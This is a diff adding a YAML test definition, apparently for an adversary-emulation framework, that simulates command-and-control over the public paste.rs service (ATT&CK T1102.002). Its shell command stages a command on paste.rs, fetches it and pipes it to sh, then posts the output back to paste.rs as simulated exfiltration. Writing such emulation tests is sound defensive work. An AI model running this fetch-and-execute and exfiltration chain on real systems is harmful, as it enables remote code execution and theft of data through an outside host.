@@ -1,0 +1,22 @@
+---
+- id: 684de8827bcd48260b270d08c84f534c
+  name: Bidirectional C2 Simulation via paste.rs (sh)
+  description: 'This test replicates a full bidirectional C2 flow using the public
+    paste.rs service...
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1102.002
+    name: 'Web Service: Bidirectional Communication'
+  platforms:
+    linux:
+      sh:
+        command: 'STAGE_URL=$(curl -s -X POST -d "echo Simulated host discovery output"
+          "https://paste.rs"); echo "Command staged at: $STAGE_URL"; OUTPUT=$(curl
+          -s "$STAGE_URL" | sh 2>&1); echo "Fetched and executed command. Output:
+          $OUTPUT"; EXFIL_URL=$(echo "$OUTPUT" | curl -s -X POST --data-binary @-
+          "https://paste.rs"); echo "Results exfiltrated to: $EXFIL_URL"; echo "---
+          Attacker sees ---"; curl -s "$EXFIL_URL"'
+        payloads: []
+        cleanup: ''
